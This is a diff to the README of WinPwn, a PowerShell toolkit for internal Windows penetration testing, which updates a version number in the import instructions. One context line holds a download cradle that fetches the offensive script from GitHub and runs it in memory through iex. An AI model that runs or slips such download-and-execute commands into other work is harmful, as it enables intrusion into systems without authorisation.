@@ -21,7 +21,7 @@ Still much work to do - Automation for internal Windows Penetrationtest.
 			ix. FindGPOLocation --> Search for user/group rights 
 			x. Find-Fruit
 
-Just Import the Modules with "Import-Module .\WinPwn_v0.4.ps1" or with 
+Just Import the Modules with "Import-Module .\WinPwn_v0.5.ps1" or with 
 iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/WinPwn/master/WinPwn_v0.5.ps1')
 
 Functions available after Import:
